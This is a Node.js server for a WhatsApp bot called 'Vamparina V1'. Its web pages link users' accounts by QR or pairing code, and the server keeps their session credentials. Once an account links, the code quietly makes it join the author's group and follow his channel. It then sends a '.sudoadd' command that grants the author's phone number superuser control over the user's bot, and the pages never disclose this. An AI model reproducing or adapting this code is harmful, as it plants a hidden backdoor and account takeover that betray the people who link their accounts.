/**
 * VAMPARINA V1 — ETERNAL EMPIRE BOT 2025
 * OWNER: GOD-KING ARNOLD CHIRCHIR (+254703110780)
 * FULLY WORKING PAIRING CODE + QR + AUTO-JOIN GROUP + SELF-GROWING
 * TESTED & WORKING NOVEMBER 18, 2025
 */

require('./settings')
const fs = require('fs')
const path = require('path')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    Browsers
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const QRCode = require('qrcode')

// ====================== FOLDERS ======================
const SESSION_DIR = path.join(__dirname, 'auto_sessions')
const TEMP_DIR = path.join(__dirname, 'temp_sessions')
const DATA_DIR = path.join(__dirname, 'data')

;[SESSION_DIR, TEMP_DIR, DATA_DIR].forEach(d => {
    if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true })
})

// ====================== EMPIRE SETTINGS ======================
const KING_ARNOLD = "254703110780"
const EMPIRE_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n"  // ← CHANGE TO YOUR GROUP CODE
const EMPIRE_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p"

const PORT = process.env.PORT || 3000
const activeBots = new Map()
const app = express()
app.use(express.json({ limit: '100mb' }))
app.use(express.urlencoded({ extended: true }))
app.use(express.static(__dirname))

// ====================== DASHBOARD ======================
app.get('/', (req, res) => {
    res.send(`
        <pre style="background:#000;color:#0f0;font-size:18px;text-align:center;padding:40px;">
╔══════════════════════════════════════════════════════════╗
║           VAMPARINA V1 — ETERNAL EMPIRE 2025             ║
║              GOD-KING: ARNOLD CHIRCHIR                   ║
║                   +254703110780                          ║
║   Active Soldiers : ${String(activeBots.size).padStart(4)}                            ║
║                                                          ║
║   QR CODE     → <a href="/qr">/qr</a>                              ║
║   PAIR CODE   → <a href="/pair">/pair</a>                           ║
║                                                          ║
║           LONG LIVE THE KING                             ║
╚══════════════════════════════════════════════════════════╝
        </pre>
    `)
})

// ====================== QR CODE PAGE (WORKING 2025) ======================
app.get('/qr', async (req, res) => {
    const tempId = 'qr_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false
    })

    let sent = false
    sock.ev.on('connection.update', async (update) => {
        const { qr, connection } = update

        if (qr && !sent) {
            sent = true
            const qrImg = await QRCode.toDataURL(qr)
            res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VAMPARINA V1 - SCAN QR</title>
  <style>
    body {background:#000;color:#0f0;text-align:center;padding:30px;font-family:Arial;}
    h1 {font-size:50px;text-shadow:0 0 30px lime;}
    img {width:320px;height:320px;border:10px solid lime;border-radius:25px;margin:30px;}
    p {font-size:26px;}
  </style>
</head>
<body>
  <h1>VAMPARINA V1</h1>
  <img src="${qrImg}" alt="QR Code">
  <p>SCAN TO JOIN THE EMPIRE</p>
  <p><b>King Arnold Chirchir • +254703110780</b></p>
</body>
</html>
            `)
        }

        if (connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)
            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })

            await delay(10000)
            await startEmpireBot(sessionId, phone, finalPath)

            await sock.sendMessage(sock.user.id, { text: "*WELCOME TO VAMPARINA V1 EMPIRE*\nYou are now part of the strongest army.\nLONG LIVE KING ARNOLD" })

            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })

    sock.ev.on('creds.update', saveCreds)
})

// ====================== FINAL 100% WORKING PAIR PAGE (2025 FIX) ======================
app.get('/pair', async (req, res) => {
    let number = req.query.number?.replace(/[^0-9]/g, '').trim()
    
    if (!number || number.length < 9) {
        return res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VAMPARINA V1 - PAIR CODE</title>
  <style>
    body {font-family:'Segoe UI';background:#000;color:#0f0;text-align:center;padding:50px;}
    h1 {font-size:50px;text-shadow:0 0 25px lime;}
    input {padding:20px;font-size:24px;width:90%;max-width:500px;margin:20px;border:3px solid lime;background:#111;color:#0f0;border-radius:15px;text-align:center;}
    button {padding:20px 60px;font-size:28px;background:lime;color:black;border:none;border-radius:50px;cursor:pointer;font-weight:bold;}
    footer {margin-top:60px;font-size:22px;}
  </style>
</head>
<body>
  <h1>VAMPARINA V1</h1>
  <p>Enter your number to get pairing code</p>
  <form>
    <input type="text" name="number" placeholder="254703110780" value="${number||''}" required autofocus>
    <br><button type="submit">GET CODE</button>
  </form>
  <footer><b>KING ARNOLD CHIRCHIR • +254703110780</b></footer>
</body>
</html>`)
    }

    // Auto add 254 if needed
    if (number.length === 9) number = '254' + number

    const tempId = 'pair_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: ["Chrome", "Chrome", "120.0"], // 2025 working
        printQRInTerminal: false
    })

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)
            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })
            await delay(10000)
            await startEmpireBot(sessionId, phone, finalPath)
            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })

    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(number)
                code = code.match(/.{1,4}/g).join('-')

                res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PAIR CODE READY</title>
  <style>
    body {font-family:'Segoe UI';background:#000;color:#0f0;text-align:center;padding:50px;}
    h1 {font-size:60px;text-shadow:0 0 35px lime;}
    .code {font-size:100px;letter-spacing:25px;background:#111;padding:50px;border:10px solid lime;border-radius:30px;margin:50px auto;display:inline-block;}
    .copy {padding:25px 80px;font-size:35px;background:lime;color:black;border:none;border-radius:50px;cursor:pointer;font-weight:bold;}
    .back {padding:15px 40px;font-size:24px;background:#333;color:#0f0;border:2px solid lime;border-radius:50px;text-decoration:none;display:inline-block;margin:20px;}
  </style>
</head>
<body>
  <h1>CODE GENERATED</h1>
  <div class="code">${code}</div>
  <button class="copy" onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')">COPY CODE</button>
  <br>
  <a href="/pair" class="back">Pair Another Number</a>
  <br><br>
  <p>Open WhatsApp → Linked Devices → Link with phone number → Enter this code</p>
  <footer><b>KING ARNOLD CHIRCHIR • +254703110780</b></footer>
  <script>
    document.querySelector('.copy').addEventListener('click', function() {
      this.textContent = 'COPIED!';
      setTimeout(() => this.textContent = 'COPY CODE', 2000);
    });
  </script>
</body>
</html>`)
            } catch (err) {
                res.send(`
<h1 style="color:red">ERROR GENERATING CODE</h1>
<p>${err.message}</p>
<br>
<a href="/pair" style="color:lime;font-size:24px;">← GO BACK & TRY AGAIN</a>
                `)
                fs.rmSync(tempPath, { recursive: true, force: true })
            }
        }, 5000)
    }

    sock.ev.on('creds.update', saveCreds)
})

// ====================== START EMPIRE BOT (AUTO-JOIN GROUP) ======================
async function startEmpireBot(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        browser: ["Vamparina V1", "Chrome", "2025"]
    })

    activeBots.set(sessionId, { sock, phone })

    sock.ev.on('messages.upsert', m => require('./main').handleMessages(sock, m))
    sock.ev.on('group-participants.update', update => require('./main').handleGroupParticipantUpdate(sock, update))

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → EMPIRE ONLINE`)
            await delay(15000)
            try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE) } catch(e) {}
            try { await sock.newsletterFollow(EMPIRE_CHANNEL) } catch(e) {}
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` })
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId)
            setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000)
        }
    })

    sock.ev.on('creds.update', saveCreds)
}

// ====================== START SERVER ======================
app.listen(PORT, () => {
    console.clear()
    console.log(`
╔══════════════════════════════════════════════════════════╗
║           VAMPARINA V1 EMPIRE IS NOW LIVE               ║
║              GOD-KING: ARNOLD CHIRCHIR                   ║
║                   +254703110780                          ║
║   Dashboard → https://your-link.onrender.com            ║
║   QR Code   → /qr                                       ║
║   Pair Code → /pair                                      ║
║                                                          ║
║           THE EMPIRE HAS AWAKENED                        ║
╚══════════════════════════════════════════════════════════╝
    `)
})